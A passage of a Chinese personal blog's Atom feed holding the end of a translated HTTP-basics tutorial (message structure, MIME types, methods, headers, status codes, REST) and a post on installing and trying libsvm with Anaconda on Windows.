&quot;http://www.example.com/example&quot;,</span><br><span class="line">    &quot;content_type&quot;: &quot;json&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的例子, 我们来快速地比较一下GET请求报文和POST请求报文。</p><p>请求报文的第一行是<strong>请求行</strong>。请求行包括<strong>请求方法</strong>、请求URI和HTTP版本。</p><p>接下来几行是<strong>请求首部字段</strong>。请求首部字段提供请求报文的附加信息, 如请求响应的内容类型、授权信息等。</p><p>对于GET请求来说, HTTP报文到这里结束了。而POST请求还可以传输(实体)主体, 并且可以以报文主体的形式携带附加信息。在创建GitHub webhook(网络回调)时, 会产生有附加信息的JSON数据——关于如何为有URI标识的特定项目创建webhook——这个数据在创建webhook时是必不可少的, 通过POST请求向GitHub API 提供该数据。</p><p><em>注：《图解HTTP》一书中提到实体主体和报文实体的区别, 一般来说实体主体和报文主体是相同的, 只有在编码时会改变实体主体,也就是说如果我分别用deflate(zlib)和identity(不进行编码)对内容进行编码, 只会影响实体主体而不会影响报文实体。</em></p><p>HTTP报文的请求行和各种首部字段——即报文首部——后面必须有 <cr> <lf> (回车符\r和换行符\n), 并且报文首部与的报文主体之间存在一个空行, 该空行仅包含 CRLF。</lf></cr></p><p>HTTP 请求协议相关内容参照: <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html" target="_blank" rel="noopener">https://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html</a></p><p>之后, 服务器端会如何响应这些请求呢? </p><h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: GitHub.com</span><br><span class="line">Date: Sun, 18 Jun 2017 13:10:41 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Status: 200 OK</span><br><span class="line">X-RateLimit-Limit: 5000</span><br><span class="line">X-RateLimit-Remaining: 4996</span><br><span class="line">X-RateLimit-Reset: 1497792723</span><br><span class="line">Cache-Control: private, max-age=60, s-maxage=60</span><br><span class="line"> </span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;type&quot;: &quot;Repository&quot;,</span><br><span class="line">    &quot;id&quot;: 14437404,</span><br><span class="line">    &quot;name&quot;: &quot;web&quot;,</span><br><span class="line">    &quot;active&quot;: true,</span><br><span class="line">    &quot;events&quot;: [</span><br><span class="line">      &quot;push&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;config&quot;: &#123;</span><br><span class="line">      &quot;content_type&quot;: &quot;json&quot;,</span><br><span class="line">      &quot;insecure_ssl&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;url&quot;: &quot;http://www.example.com/example&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;updated_at&quot;: &quot;2017-06-18T12:17:15Z&quot;,</span><br><span class="line">    &quot;created_at&quot;: &quot;2017-06-18T12:03:15Z&quot;,</span><br><span class="line">    &quot;url&quot;: &quot;https://api.github.com/repos/CodeMazeBlog/ConsumeRestfulApisExamples/hooks/14437404&quot;,</span><br><span class="line">    &quot;test_url&quot;: &quot;https://api.github.com/repos/CodeMazeBlog/ConsumeRestfulApisExamples/hooks/14437404/test&quot;,</span><br><span class="line">    &quot;ping_url&quot;: &quot;https://api.github.com/repos/CodeMazeBlog/ConsumeRestfulApisExamples/hooks/14437404/pings&quot;,</span><br><span class="line">    &quot;last_response&quot;: &#123;</span><br><span class="line">      &quot;code&quot;: 422,</span><br><span class="line">      &quot;status&quot;: &quot;misconfigured&quot;,</span><br><span class="line">      &quot;message&quot;: &quot;Invalid HTTP Response: 404&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>除了第一行(<strong>状态行</strong>), 响应报文与请求报文的结构几乎相同, 惊奇地发现响应报文的状态行(实际上)是响应状态的相关信息。</p><p>在状态行之后, 是响应报文的各种首部字段和响应报文主体。</p><p><em>注：响应状态包括相应结果的状态码, 原因短语和HTTP版本</em></p><p>HTTP响应报文参照: <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec6.html" target="_blank" rel="noopener">https://www.w3.org/Protocols/rfc2616/rfc2616-sec6.html</a></p><h2 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h2><p>MIME类型是互联网中用于描述文件类型的一种标准化方法。 (我们使用的)浏览器上就有一个MIME类型的列表,同样的, WEB服务器端也有一个MIME类型的列表, 通过这种方法, 我们就可以在不同的操作系统间传输常见类型的文件。</p><p>有趣的是, 实际上MIME是多用途因特网邮件扩展的意思,它们一开始是邮件用来处理不同类型的数据的。但是从那之后, MIME(就)被改造成为HTTP协议和其他协议使用的机制了。</p><p>MIME类型由类型(type)、子类型(subtype)、可选参数(optional parameters)构成, 格式为:类型/子类型;可选参数。</p><p>例子如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Accept: image/gif</span><br></pre></td></tr></table></figure><p>你可以在<a href>HTTP指南</a>中查看常见的MIME类型和子类型列表。</p><h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>HTTP请求方法(也被称为HTTP动词)定义了将在资源上执行的操作。HTTP中有多种请求方法, 最常用的是GET方法和POST方法。</p><p>请求方法有幂等性和非幂等性之分。“幂等性”与“非幂等性”只是花里胡哨的术语, (实际上)它是用来反映某一请求方法多次调用同一资源的操作安全与否的。这意味着, 为了安全, GET方法—用于获取资源的方法—默认情况下应该是幂等性的方法。在用GET方法调用同一资源时, 不应该产生不同的响应结果。与之相对, POST方法就不应该是幂等性方法。</p><p><em>注:关于幂等性, 可以看看<a href="https://zhuanlan.zhihu.com/p/20081828" target="_blank" rel="noopener">理解HTTP幂等性</a>这篇文章, 里面的解释还是比较容易理解的。</em></p><p>HTTP/1.1版本之前,只有GET、POST、HEAD三种请求方法。在HTTP/1.1规范中, 引进了许多新的方法:OPTIONS、PUT、DELETE、TRACE、CONNECT。</p><p>如果想要进一步了解请求方法, 可以参考<a href>HTTP指南</a></p><h2 id="报文首部"><a href="#报文首部" class="headerlink" title="报文首部"></a>报文首部</h2><p>报文首部域是由冒号分割的首部字段名和字段值组成的, 反映了服务器端或客户端请求或响应的内容及属性, 位于请求报文或响应报文第一行之后。</p><p>这里有五种报文首部类型：</p><ul><li><p><strong>通用首部字段(General headers)</strong>:该首部字段被应用于客户端和服务器端双方。举一个常见的例子,日期首部字段(Date headers)就指明了创建报文的日期时间。</p></li><li><p><strong>请求首部字段(Request headers)</strong>：该首部字段仅在请求报文中出现, 向服务器端提供附加信息。例如, “Accept:<em>/</em>“告知了服务器客户端可处理任何媒体类型。</p></li><li><p><strong>响应首部字段(Response headers)</strong><br>：该首部字段仅在响应报文中出现,想客户端提供附加信息。例如, “Allow：GET, HEAD, PUT”告知了客户端服务器能接受的请求资源方法。</p></li><li><p><strong>实体首部字段(Entity headers)</strong>：该首部字段用于实体主体。例如”Content-Type: text/html”告知应用程序(传输)的数据是HTML文件。</p></li><li><p><strong>扩展首部字段(Extension headers)</strong>：这些非标准首部字段可由应用程序开发人员创建, 尽管该首部字段不在HTTP规范中, 但仍可使用。<br>你可以在<a href>HTTP指南</a>中查看常用请求首部和响应首部字段。</p></li></ul><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p><strong>状态码(Statue code)</strong>是一个三位数字, 表示请求的结果。<strong>原因短语(Reason phrase)</strong>是用自然语言表示的状态代码解释, 跟随在状态码之后。</p><p>例子如下：</p><ul><li>200 OK —— 表示从客户端发来的请求在服务器端正常处理了</li><li>404 Not Found —— 服务器上无法找到请求资源</li><li>500 Internal Server Error —— 服务器端在执行请求时发生错误</li></ul><p>状态码根据不同的范围分为五种不同的类型。</p><p>如果想查看状态码的分类和完整的状态码列表及其含义, 可以看<a href>HTTP指南</a>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>emmm, 这个信息量挺大的。</p><p>学习HTTP协议的基础概念, 虽然不能帮助你直接解决问题, 但是从中学习到的互联网通信的基本原则, 几乎适用于所有比HTTP协议更高级别的问题。不管是 REST、APIs、WEB应用程序开发还是网络方面出现的问题, 现在, 在解决这些问题时, 你至少可以更加自信一点。</p><p>不可否认, HTTP讲起来是一个相当大的话题, 之后的内容, 与HTTP协议的基本概念比起来多多了。 </p><p>HTTP体系结构方面会在<a href="https://se8s0n.github.io/2018/08/18/HTTP%E7%B3%BB%E5%88%97(%E4%BA%8C" target="_blank" rel="noopener">HTTP系列(二)</a>/)中介绍。</p><h1 id="名词解释与概述："><a href="#名词解释与概述：" class="headerlink" title="名词解释与概述："></a>名词解释与概述：</h1><h2 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h2><p><strong>REST(Representational State Transfer)</strong>——表现层状态转换, 是一种用来描述网络中Client和Server的交互形式的协议。<br>下面对名词进行解释：</p><ol><li><p>表现层(Representation), 直白地说就是<strong>资源(信息实体)具体呈现出来的形式</strong>, 例如:文本表现为TXT格式、HTML格式或者是XML格式。</p></li><li><p>状态转换(State Transfer), 这个状态转换实际上是发生在Client访问Server的过程中。为什么会选择无状态HTTP作为实现REST架构的协议? 因为HTTP可发送四种状态:GET、POST、PUT、DELETE。这四个HTTP协议的动词可以用来进行不同的操作：GET用来获取资源, POST用来新建更新资源,PUT用来更新资源,DELETE用来删除资源。在写的时候我自己有点小迷糊, 什么是有状态的? 什么是无状态的呢? 无状态, 其实就是所有的状态都保存在Server。因此, 状态转换, 是在信息由Client传送到Server的中间过程实现的。<br><img src="https://cdn.crunchify.com/wp-content/uploads/2012/10/Crunchify.com-RESTful-Introduction.png" alt="RESTful"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在网上看到这篇很棒的文章, 所以接下来, 我会边学习边翻译&lt;a href=&quot;https://code-maze.com/http-serie
      
    
    </summary>
    
    
      <category term="HTTP" scheme="http://Se8S0n.github.io.git/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>libsvm环境配置及使用方法</title>
    <link href="http://Se8S0n.github.io.git/2018/01/22/libsvm%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://Se8S0n.github.io.git/2018/01/22/libsvm环境配置及使用方法/</id>
    <published>2018-01-22T20:39:39.000Z</published>
    <updated>2021-08-05T06:51:27.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在刚刚学习机器学习内容的时候，就给了自己很清晰的定位“未想有所成，只想有所用”。因为机缘巧合接触的机器学习，假期想学习的内容里面需要安装libsvm包，在翔翔的远程帮助和及其懈怠的状态下，我按照以下步骤在五分钟之内解决了安装libsvm包的时候出现的问题。（前提是你在Anaconda找不到libsvm的包）</p><h2 id="环境、所用到的软件及其版本"><a href="#环境、所用到的软件及其版本" class="headerlink" title="环境、所用到的软件及其版本"></a>环境、所用到的软件及其版本</h2><pre><code>win 10Anaconda3_5.5.0python 3.6Visual Studio 2013（当然这个不在我电脑上=v=，感兴趣地可以按照我之后给的链接在本机运行一下）PyCharm 2017.2.3</code></pre><h2 id="libsvm环境配置"><a href="#libsvm环境配置" class="headerlink" title="libsvm环境配置"></a>libsvm环境配置</h2><p>以下文件路径仅仅是我电脑中的，如果存放的位置不一样，请自行调整</p><ol><li>因为电脑装VS之后出现了点问题，所以不能按照<a href="http://blog.csdn.net/m624197265/article/details/41894311" target="_blank" rel="noopener">林智仁LIBSVM     python包的安装与使用</a>这个链接中64位机的解决方法。就直接用了翔翔发给我的libsvm.dll。将相关链接中的“用vs2013运行过的libsvm.dll”下载好直接放在C:\Windows\System32下即可。<img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1516631573/dll%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE_iapklk.png" alt><br>  <strong>Tips</strong>：或者在Anaconda离线包的链接中下载，按照“林智仁LIBSVM python包的安装与使用”进行操作。当时在页面不能直接找到VS的Prompt快捷方式，打开D:\develop\Visual Studio\Common7\Tools\Shortcuts中的VS2013 x64 本机工具命令提示进行nmake操作。<img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1516631572/TIM%E5%9B%BE%E7%89%8720180122141218_qko6gg.png" alt></li><li><p>直接将libsvm文件夹中python下的 svmutil.py和svm.py两个文件复制粘贴到D:\develop\Anaconda\Lib下</p></li><li><p>在python环境下测试是否安装成功<br>(1) 输入测试代码</p><pre><code>from svmutil import *y, x = svm_read_problem(&apos;../heart_scale&apos;)m = svm_train(y[:200], x[:200], &apos;-c 4&apos;)p_label, p_acc, p_val = svm_predict(y[200:], x[200:], m)</code></pre><p>(2) 测试代码结果输出：</p><pre><code>optimization finished, #iter = 257nu = 0.351161obj = -225.628984, rho = 0.636110nSV = 91, nBSV = 49Total nSV = 91Accuracy = 84.2857% (59/70) (classification)</code></pre></li></ol><h2 id="libsvm使用方法-非常简易版本"><a href="#libsvm使用方法-非常简易版本" class="headerlink" title="libsvm使用方法-非常简易版本"></a>libsvm使用方法-非常简易版本</h2><ul><li>svm_train函数<br>这里用的是彭亮视频中的例子<pre><code>from svmutil import *x = [[1,1], [2,0], [2,3]]y = [0, 0, 1]clf = svm_train(y, x, &apos;-s 0 -t 0&apos;)</code></pre></li><li>相关参数解释说明<br>  x是特征向量<br>  (在这里，x必须是list或者是tuple，因为svm_train函数第二个参数传入时限定了，如果不是的话，会有报错）<br>  y是特征向量对应的标记<br>  clf是分类器<br>  ‘-s 0 -t 0’是option,详情请见<a href="http://www.hankcs.com/wp-content/uploads/2015/10/LIBSVM%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.pdf" target="_blank" rel="noopener">LIBSVM详细介绍和使用方法</a></li><li>svm_predict函数<pre><code>from svutil import *x = [[1,1], [2,0], [2,3]]y = [0, 0, 1]x1 = [[1,1], [2,0]]y1 = [0, 1]svm_predict(y1, x1, clf)</code></pre></li></ul><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><hr><p>   <a href="http://blog.csdn.net/m624197265/article/details/41894311" target="_blank" rel="noopener">林智仁LIBSVM python包的安装与使用</a><br>   <a href="https://anaconda.org/conda-forge/repo" target="_blank" rel="noopener">Anaconda离线包</a><br>   <a href="http://www.hankcs.com/wp-content/uploads/2015/10/LIBSVM%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.pdf" target="_blank" rel="noopener">LIBSVM详细介绍和使用方法</a><br>   <a href="https://pan.baidu.com/s/1hthwNis" target="_blank" rel="noopener">用vs2013运行过的libsvm.dll 密码:aiu7</a><br>   <a href="https://pan.baidu.com/s/1htfuUNE" target="_blank" rel="noopener">libsvm-3.22 离线包 密码：gbpl</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在刚刚学习机器学习内容的时候，就给了自己很清晰的定位“未想有所成，只想有所用”。因为机缘巧合接触的机器学习，假期想学习的内容里面需要安装li
      
    
    </summary>
    
    
      <category term="机器学习" scheme="http://Se8S0n.github.io.git/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
